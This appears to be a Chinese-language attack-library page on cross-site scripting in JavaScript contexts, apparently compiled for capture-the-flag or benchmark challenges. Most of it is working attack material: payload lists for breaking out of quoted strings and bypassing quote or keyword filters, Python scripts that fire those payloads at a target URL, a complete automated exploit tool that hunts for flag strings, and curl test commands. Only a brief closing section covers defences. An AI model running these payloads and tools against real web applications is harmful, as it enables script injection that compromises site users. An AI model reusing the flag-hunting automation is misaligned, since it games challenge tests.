# XSS-JavaScript上下文注入-攻击库

## 概述

**攻击类型**：跨站脚本攻击 - JavaScript上下文注入  
**影响范围**：所有Web应用  
**风险等级**：High  
**攻击目标**：当用户输入被插入到JavaScript代码中时，通过闭合字符串、注入代码执行XSS

**核心原理**：
当用户输入直接嵌入到HTML页面的`<script>`标签内的JavaScript代码中时，攻击者可以通过闭合JavaScript字符串、注释后续代码，注入恶意JavaScript执行XSS攻击。

**典型漏洞场景**：
```html
<script>
var name = "USER_INPUT";  // 用户输入插入到JavaScript字符串中
document.write('Hello ' + name);
</script>
```

**攻击Payload**：
```
"; alert('XSS'); //
```

**执行结果**：
```javascript
var name = ""; alert('XSS'); //";  // 后续代码被注释
document.write('Hello ' + name);
```

---

## 核心攻击技术

### 技术1：基本字符串闭合注入

**原理**：
用户输入被插入到JavaScript字符串中，通过闭合引号并注入代码。

**漏洞代码示例**：
```html
<script>
var username = "<?php echo $_GET['name']; ?>";
document.write('Welcome ' + username);
</script>
```

**攻击Payload**：
```javascript
// 双引号闭合
"; alert('XSS'); //

// 单引号闭合
'; alert('XSS'); //

// 使用注释
"; alert(1)//
"; alert(1)/*

// 不使用分号
" alert(1)//
```

**完整注入示例**：
```html
<!-- 原始代码 -->
<script>
var name = "USER_INPUT";
</script>

<!-- Payload: "; alert('XSS'); // -->
<script>
var name = ""; alert('XSS'); //";
</script>

<!-- 结果：成功执行alert('XSS') -->
```

**利用代码**：
```python
import requests

def exploit_js_string_injection(target_url, param_name='name'):
    """JavaScript字符串上下文XSS"""
    
    payloads = [
        '"; alert("XSS"); //',
        '\'; alert("XSS"); //',
        '"; alert(String.fromCharCode(88,83,83)); //',
        '\\"; alert(1); //',
        '"; alert`XSS`; //',
    ]
    
    for payload in payloads:
        try:
            params = {param_name: payload}
            r = requests.get(target_url, params=params)
            
            # 检查payload是否成功注入到JavaScript中
            if payload in r.text and '<script>' in r.text:
                print(f"[+] 成功注入: {payload}")
                return payload
                
        except Exception as e:
            continue
    
    return None
```

---

### 技术2：绕过引号过滤

**原理**：
当引号被过滤或转义时，使用其他技术绕过限制。

**绕过技术1 - 使用反斜杠**：
```javascript
// 原始代码
var name = "USER_INPUT";

// Payload: \ (单个反斜杠)
var name = "\";  // 转义了结束引号

// 然后在下一个参数注入代码
```

**绕过技术2 - Unicode编码**：
```javascript
// Payload: \u0022; alert(1); //
var name = "\u0022; alert(1); //";
// \u0022 是双引号的Unicode编码
```

**绕过技术3 - 十六进制编码**：
```javascript
// Payload: \x22; alert(1); //
var name = "\x22; alert(1); //";
// \x22 是双引号的十六进制编码
```

**绕过技术4 - 使用模板字符串**（ES6）：
```javascript
// Payload: `; alert(1); //
var name = "`; alert(1); //";

// 或使用模板字符串注入
// Payload: ${alert(1)}
var name = "${alert(1)}";
```

**完整绕过代码**：
```python
def bypass_quote_filter(target_url, param_name):
    """绕过引号过滤"""
    
    bypass_payloads = [
        # Unicode编码
        '\\u0022; alert(1); //',
        '\\u0027; alert(1); //',
        
        # 十六进制编码
        '\\x22; alert(1); //',
        '\\x27; alert(1); //',
        
        # 反斜杠逃逸
        '\\\\"; alert(1); //',
        
        # 模板字符串
        '`; alert(1); //',
        '${alert(1)}',
        
        # 使用换行符
        '\\n"; alert(1); //',
    ]
    
    for payload in bypass_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if 'alert' in r.text:
            print(f"[+] 绕过成功: {payload}")
            return payload
    
    return None
```

---

### 技术3：document.write()注入

**原理**：
当用户输入被用于`document.write()`时，可以注入HTML标签执行XSS。

**漏洞代码示例**：
```javascript
<script>
var name = "USER_INPUT";
document.write('Hello ' + name);
</script>
```

**攻击Payload**：
```javascript
// 注入HTML标签
<img src=x onerror=alert(1)>

// 注入script标签
</script><script>alert(1)</script>

// 混合注入
"; document.write('<img src=x onerror=alert(1)>'); //
```

**完整利用代码**：
```python
def exploit_document_write(target_url, param_name):
    """document.write()上下文XSS"""
    
    payloads = [
        # 直接注入HTML
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        
        # 闭合script后注入
        '</script><script>alert(1)</script>',
        '</script><img src=x onerror=alert(1)>',
        
        # 在JavaScript中调用document.write
        '"; document.write("<img src=x onerror=alert(1)>"); //',
        
        # 使用innerHTML
        '"; document.body.innerHTML="<img src=x onerror=alert(1)>"; //',
    ]
    
    for payload in payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if 'onerror' in r.text or 'onload' in r.text:
            print(f"[+] document.write注入成功: {payload[:50]}...")
            return payload
    
    return None
```

---

### 技术4：事件处理器上下文注入

**原理**：
当用户输入被插入到事件处理器属性中时，可以执行JavaScript。

**漏洞代码示例**：
```html
<div onclick="showMessage('USER_INPUT')">Click me</div>
```

**攻击Payload**：
```javascript
// 闭合单引号并注入
'); alert(1); //

// 使用事件处理器
') onerror=alert(1) x='

// 完整示例
<div onclick="showMessage(''); alert(1); //')">
```

**利用代码**：
```python
def exploit_event_handler(target_url, param_name):
    """事件处理器上下文XSS"""
    
    payloads = [
        "'); alert(1); //",
        "') onerror=alert(1) x='",
        '\'); alert(1); //',
        "',alert(1),'",
    ]
    
    for payload in payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if payload in r.text:
            print(f"[+] 事件处理器注入: {payload}")
            return payload
    
    return None
```

---

### 技术5：绕过关键字黑名单

**原理**：
当`alert`、`script`等关键字被过滤时，使用替代方法执行代码。

**绕过技术1 - 使用其他函数**：
```javascript
// 不用alert，用prompt
"; prompt(1); //

// 使用confirm
"; confirm(1); //

// 使用console.log
"; console.log('XSS'); //

// 使用eval
"; eval('al'+'ert(1)'); //
```

**绕过技术2 - 编码绕过**：
```javascript
// String.fromCharCode编码
"; alert(String.fromCharCode(88,83,83)); //

// 使用eval + 编码
"; eval(String.fromCharCode(97,108,101,114,116,40,49,41)); //

// Base64编码
"; eval(atob('YWxlcnQoMSk=')); //
```

**绕过技术3 - 大小写混淆**：
```javascript
// 混合大小写
"; ALeRt(1); //

// 使用计算属性
"; window['ale'+'rt'](1); //
```

**绕过技术4 - 使用HTML实体**：
```javascript
// 使用HTML实体（在某些上下文中）
&lt;script&gt;alert(1)&lt;/script&gt;
```

**完整绕过代码**：
```python
def bypass_keyword_blacklist(target_url, param_name):
    """绕过关键字黑名单"""
    
    bypass_payloads = [
        # 使用其他函数
        '"; prompt("XSS"); //',
        '"; confirm("XSS"); //',
        
        # 编码绕过
        '"; alert(String.fromCharCode(88,83,83)); //',
        '"; eval(String.fromCharCode(97,108,101,114,116,40,49,41)); //',
        '"; eval(atob("YWxlcnQoMSk=")); //',
        
        # 大小写混淆
        '"; ALeRt(1); //',
        '"; window["ale"+"rt"](1); //',
        
        # 使用构造函数
        '"; Function("ale"+"rt(1)")(); //',
        '"; [].constructor.constructor("ale"+"rt(1)")(); //',
    ]
    
    for payload in bypass_payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        # 检查是否成功绕过（不检查alert关键字）
        if any(keyword in r.text.lower() for keyword in ['prompt', 'confirm', 'fromcharcode', 'eval']):
            print(f"[+] 关键字绕过成功: {payload[:50]}...")
            return payload
    
    return None
```

---

### 技术6：利用PhantomJS检测绕过

**原理**：
某些应用使用PhantomJS检测XSS，需要确保payload在PhantomJS中能成功执行alert('XSS')。

**检测机制分析**：
```python
# check.js 通常检查
# 1. 是否执行了alert()
# 2. alert的参数是否为"XSS"
```

**成功Payload要求**：
```javascript
// 必须执行 alert('XSS') 或 alert("XSS")
// 不能是 alert(1) 或其他参数
```

**利用代码**：
```python
def exploit_phantomjs_detection(target_url, param_name):
    """针对PhantomJS检测的XSS"""
    
    # 必须alert('XSS')才能通过检测
    payloads = [
        '"; alert("XSS"); //',
        '\'; alert("XSS"); //',
        '"; alert(\'XSS\'); //',
        '\\"; alert("XSS"); //',
    ]
    
    for payload in payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        # 检查是否包含成功标志
        if 'congratulations' in r.text.lower() or 'flag{' in r.text.lower():
            print(f"[+] PhantomJS检测通过!")
            print(f"[+] Payload: {payload}")
            return r.text
    
    return None
```

---

### 技术7：多行JavaScript注入

**原理**：
使用换行符或多行注释来绕过某些过滤。

**Payload示例**：
```javascript
// 使用换行符
"\n alert('XSS'); //

// 使用多行注释
"; /*  
alert('XSS');  
*/ //

// 使用多个语句
"; var x=1; alert('XSS'); //
```

**利用代码**：
```python
def exploit_multiline_injection(target_url, param_name):
    """多行JavaScript注入"""
    
    payloads = [
        '\\n alert("XSS"); //',
        '\\r\\n alert("XSS"); //',
        '"; /* \\n alert("XSS"); \\n */ //',
        '"; var x=1; alert("XSS"); //',
    ]
    
    for payload in payloads:
        params = {param_name: payload}
        r = requests.get(target_url, params=params)
        
        if 'alert' in r.text:
            print(f"[+] 多行注入成功: {payload}")
            return payload
    
    return None
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
JavaScript上下文XSS完整利用工具
"""
import requests
import sys
import re
from urllib.parse import quote

class JSContextXSSExploit:
    def __init__(self, target_url, param_name='name'):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
    
    def test_basic_injection(self):
        """测试基本JavaScript注入"""
        print("[*] 测试基本JavaScript字符串注入...")
        
        payloads = [
            '"; alert("XSS"); //',
            '\'; alert("XSS"); //',
            '"; alert(\'XSS\'); //',
            '\\"; alert("XSS"); //',
        ]
        
        for payload in payloads:
            try:
                params = {self.param_name: payload}
                r = self.session.get(self.target_url, params=params)
                
                # 检查成功标志
                if self.check_success(r.text):
                    print(f"[+] 基本注入成功!")
                    print(f"[+] Payload: {payload}")
                    return r.text
                    
            except Exception as e:
                continue
        
        return None
    
    def check_success(self, response_text):
        """检查XSS是否成功"""
        success_indicators = [
            'congratulations',
            'flag{',
            'correct',
            'success',
            'xss detected'
        ]
        
        response_lower = response_text.lower()
        
        for indicator in success_indicators:
            if indicator in response_lower:
                return True
        
        return False
    
    def bypass_quote_filter(self):
        """绕过引号过滤"""
        print("[*] 尝试绕过引号过滤...")
        
        bypass_payloads = [
            '\\u0022; alert("XSS"); //',
            '\\x22; alert("XSS"); //',
            '`; alert("XSS"); //',
            '${alert("XSS")}',
        ]
        
        for payload in bypass_payloads:
            params = {self.param_name: payload}
            r = self.session.get(self.target_url, params=params)
            
            if self.check_success(r.text):
                print(f"[+] 引号过滤绕过成功!")
                print(f"[+] Payload: {payload}")
                return r.text
        
        return None
    
    def bypass_keyword_blacklist(self):
        """绕过关键字黑名单"""
        print("[*] 尝试绕过关键字黑名单...")
        
        bypass_payloads = [
            '"; prompt("XSS"); //',
            '"; confirm("XSS"); //',
            '"; alert(String.fromCharCode(88,83,83)); //',
            '"; eval(atob("YWxlcnQoIlhTUyIp")); //',
            '"; Function("ale"+"rt(\\"XSS\\")")(); //',
        ]
        
        for payload in bypass_payloads:
            params = {self.param_name: payload}
            r = self.session.get(self.target_url, params=params)
            
            if self.check_success(r.text):
                print(f"[+] 关键字绕过成功!")
                print(f"[+] Payload: {payload}")
                return r.text
        
        return None
    
    def extract_flag(self, response_text):
        """提取FLAG"""
        flag_match = re.search(r'flag\{[^}]+\}', response_text, re.I)
        
        if flag_match:
            return flag_match.group()
        
        # 检查其他可能的flag格式
        patterns = [
            r'flag:\s*([a-f0-9]{32})',
            r'xbow\{[^}]+\}',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.I)
            if match:
                return match.group()
        
        return None
    
    def full_exploit(self):
        """完整利用流程"""
        print("="*60)
        print("JavaScript上下文XSS利用工具")
        print("="*60 + "\n")
        
        print(f"[*] 目标: {self.target_url}")
        print(f"[*] 参数: {self.param_name}\n")
        
        # 1. 测试基本注入
        result = self.test_basic_injection()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        # 2. 绕过引号过滤
        result = self.bypass_quote_filter()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        # 3. 绕过关键字黑名单
        result = self.bypass_keyword_blacklist()
        
        if result:
            flag = self.extract_flag(result)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return flag
            return result
        
        print("\n[-] 所有方法均未成功")
        return None

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [参数名]")
        print(f"例如: {sys.argv[0]} http://target/page name")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'name'
    
    exploit = JSContextXSSExploit(target, param)
    result = exploit.full_exploit()
    
    if result:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击失败")
```

---

## 实战场景

### 场景1：Flask XSS挑战

**应用背景**：
Flask应用，用户输入插入到JavaScript字符串中。

**漏洞代码**：
```python
@app.route('/page')
def xss6():
    msg = request.args.get('name','')
    script_content = """<script> var name = "%s"; document.write('Hello ' + name); </script>""" % msg
    return script_content
```

**利用步骤**：
```bash
curl "http://target/page?name=\"; alert('XSS'); //"
```

---

## 手动测试命令

```bash
# 1. 基本双引号闭合
curl "http://target/page?name=\"; alert('XSS'); //"

# 2. 单引号闭合
curl "http://target/page?name='; alert('XSS'); //"

# 3. 编码绕过
curl "http://target/page?name=\\u0022; alert('XSS'); //"

# 4. 浏览器测试
http://target/page?name="; alert('XSS'); //
```

---

## Payload速查表

| 场景 | Payload | 说明 |
|------|---------|------|
| 双引号上下文 | `"; alert('XSS'); //` | 基本闭合 |
| 单引号上下文 | `'; alert('XSS'); //` | 单引号闭合 |
| Unicode绕过 | `\u0022; alert(1); //` | 引号编码 |
| 模板字符串 | <code>\`; alert(1); //</code> | ES6特性 |
| 关键字绕过 | `"; prompt(1); //` | 替代函数 |

---

## 防御措施

### 1. 输出编码

```javascript
// 不要这样
var name = "<?php echo $_GET['name']; ?>";

// 应该这样
var name = "<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES); ?>";
```

### 2. 使用JSON编码

```javascript
// 使用json_encode确保安全
var data = <?php echo json_encode($_GET['data']); ?>;
```

### 3. 避免直接插入

```javascript
// 不要直接插入用户输入
// 使用数据属性传递
<div id="user-data" data-name="<?php echo htmlspecialchars($name); ?>"></div>

<script>
var name = document.getElementById('user-data').dataset.name;
</script>
```

---

## 总结

**JavaScript上下文XSS攻击要点**：
1. ✅ 闭合JavaScript字符串引号
2. ✅ 使用`//`或`/**/`注释后续代码
3. ✅ 绕过引号过滤（Unicode、十六进制）
4. ✅ 绕过关键字黑名单（编码、替代函数）
5. ✅ PhantomJS检测需alert('XSS')
6. ✅ 防御关键：输出编码 + 使用JSON编码

JavaScript上下文XSS是最常见的XSS类型之一，危害严重但利用简单。
